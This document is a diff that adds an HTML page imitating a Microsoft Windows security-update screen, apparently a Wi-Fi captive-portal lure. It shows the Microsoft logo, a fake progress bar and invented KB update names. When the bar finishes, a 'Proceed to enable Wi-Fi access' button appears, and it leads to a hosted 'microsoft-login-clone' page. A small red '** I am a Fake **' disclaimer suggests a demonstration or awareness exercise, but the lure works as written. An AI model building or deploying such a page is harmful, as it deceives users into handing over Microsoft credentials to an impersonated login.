@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft Update for Wi-Fi access</title>
+
+<style>
+body {
+    font-family: "Segoe UI", Arial, sans-serif;
+    background: #ffffff;
+    margin: 0;
+    padding: 0;
+}
+
+.topbar {
+    height: 4px;
+    background: #0078d4;
+}
+
+.container {
+    width: 700px;
+    margin: 40px auto;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    margin-bottom: 0px;
+}
+
+.logo-box {
+    width: 38px;
+    height: 38px;
+    background: #c8102e;
+    margin-right: 12px;
+}
+
+.logo-text {
+    font-size: 26px;
+    color: #444;
+    font-weight: 300;
+}
+
+h1 {
+    font-weight: 300;
+    color: #222;
+    margin-bottom: 10px;
+}
+
+.subtitle {
+    color: #666;
+    margin-bottom: 25px;
+}
+
+.progress-container {
+    width: 100%;
+    background: #ececec;
+    height: 12px;
+    margin-bottom: 10px;
+}
+
+.progress-bar {
+    width: 0%;
+    height: 100%;
+    background: #0078d4;
+    transition: width 1s linear;
+}
+
+.percent {
+    font-size: 18px;
+    color: #666;
+    margin-bottom: 10px;
+}
+
+.message {
+    color: #666;
+    font-size: 18px;
+}
+
+.footer {
+    margin-top: 20px;
+    padding-top: 30px;
+    border-top: 1px solid #ddd;
+    color: #888;
+    font-size: 15px;
+}
+
+.details {
+    margin-top: 25px;
+    color: #666;
+}
+
+.details ul {
+    margin-top: 10px;
+}
+
+.complete {
+    color: #107c10;
+    font-weight: 600;
+}
+</style>
+</head>
+
+<body>
+
+<div class="topbar"></div>
+
+<div class="container">
+
+    <div class="logo">
+        <!-- <div class="logo-box"></div> -->
+        <!-- <div class="logo-text"></div> -->
+        <img src="ms-logo.png" height="32" alt="Microsoft" />
+
+    </div>
+
+    <h1>Working on updates</h1>
+
+    <div class="subtitle">
+        Security compliance updates pending for your device
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="percent" id="percentText">
+        0% complete
+    </div>
+
+    <div class="message" id="messageText">
+        Downloading Microsoft Security Update KB875421...
+    </div>
+
+    <div class="details">
+        Installing:
+        <ul>
+            <li>Microsoft Defender Protection</li>
+            <li>Microsoft Device Compliance Policy</li>
+            <li>Microsoft Management Agent</li>
+            <li>Security Definition Updates</li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        Please wait while installing security compliance update.<br>
+        <p class="mb-16 fs-13" style="font-weight: 500; color: red;">** I am a Fake **</p>
+    </div>
+    <div style="margin-top:10px;">
+    <button id="nextBtn"
+            onclick="window.location.href='https://htmlpreview.github.io/?https://raw.githubusercontent.com/i-am-a-fake/microsoft-login-clone/refs/heads/main/index.html';"
+            style="
+                display:none;
+                background:#0078d4;
+                color:white;
+                border:none;
+                padding:12px 28px;
+                font-size:16px;
+                cursor:pointer;
+                border-radius:3px;
+            ">
+        Proceed to enable Wi-Fi access
+    </button>
+</div>
+
+</div>
+
+<script>
+
+let progress = 0;
+
+const messages = [
+    "Downloading Microsoft Product Update KB875421...",
+    "Installing Security Definitions...",
+    "Updating Device Compliance Policies...",
+    "Configuring Endpoint Protection...",
+    "Installing Management Components...",
+    "Applying Security Enhancements...",
+    "Configuring Wi-Fi Network...",
+    "Enabling  Wi-Fi Network Access..."
+];
+
+function randomKB() {
+    return Math.floor(100000 + Math.random() * 900000);
+}
+
+function updateProgress() {
+
+    if (progress >= 100) {
+
+    document.getElementById("messageText").innerHTML =
+        "<span class='complete'>Security compliance update complete.</span>";
+
+    document.getElementById("nextBtn").style.display = "inline-block";
+
+    return;
+}
+
+    progress += Math.floor(Math.random() * 18) + 1;
+
+    if (progress > 100)
+        progress = 100;
+
+    document.getElementById("progressBar").style.width =
+        progress + "%";
+
+    document.getElementById("percentText").innerText =
+        progress + "% complete";
+
+    let msg =
+        messages[Math.floor(Math.random() * messages.length)];
+
+    if (msg.includes("KB")) {
+        msg = "Downloading Microsoft Security Update KB" +
+              randomKB() + "...";
+    }
+
+    document.getElementById("messageText").innerText = msg;
+}
+
+setInterval(updateProgress, 1500);
+
+</script>
+
+</body>
+</html>
